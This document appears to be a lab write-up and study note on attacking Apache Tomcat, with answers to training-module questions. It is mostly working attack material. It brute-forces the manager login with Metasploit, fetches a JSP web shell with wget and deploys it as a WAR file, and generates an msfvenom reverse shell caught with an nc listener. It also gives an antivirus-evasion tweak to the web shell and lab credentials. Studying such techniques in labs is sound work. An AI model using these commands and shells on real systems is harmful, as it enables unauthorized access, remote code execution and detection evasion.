# Attacking Tomcat
## Tomcat Manager - Login Brute Force
We can use the `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this.

```sh
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

## Tomcat Manager - WAR File Upload
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access.

The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```sh
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.

```sh
$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

We could also use `msfvenom` to generate a malicious WAR file. The payload `java/jsp_shell_reverse_tcp` will execute a reverse shell through a JSP file. 

```sh
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
$ nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

[This JSP](https://github.com/SecurityRiskAdvisors/cmd.jsp) web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells.

A simple change such as changing:

```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```

to:

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

## Questions
1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? **Answer: tomcat**
   - Run the metasploit module for bruteforcing → found:
        ```sh
        [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
        VHOST => web01.inlanefreight.local
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
        RPORT => 8180
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
        stop_on_success => true
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.47.27
        rhosts => 10.129.47.27
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
        <SNIP>
        [+] 10.129.47.27:8180 - Login Successful: tomcat:root
        [*] Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed
        ```
2. What is the password? **Answer: root**
3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt **Answer:**
   - Login to the manager account and upload the webshell:
        ```sh
        $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
        $ zip -r backup.war cmd.jsp 

        adding: cmd.jsp (deflated 81%)
        ```
        - Deploy `backup.war`
   - Navigate to `/backup/cmd.jsp`, leverage the shell to find the flag (the `find` command took too long, so use `tree .` with CTRL+F to find the file):
        ```
        http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat+%2Fopt%2Ftomcat%2Fapache-tomcat-10.0.10%2Fwebapps%2Ftomcat_flag.txt
        ```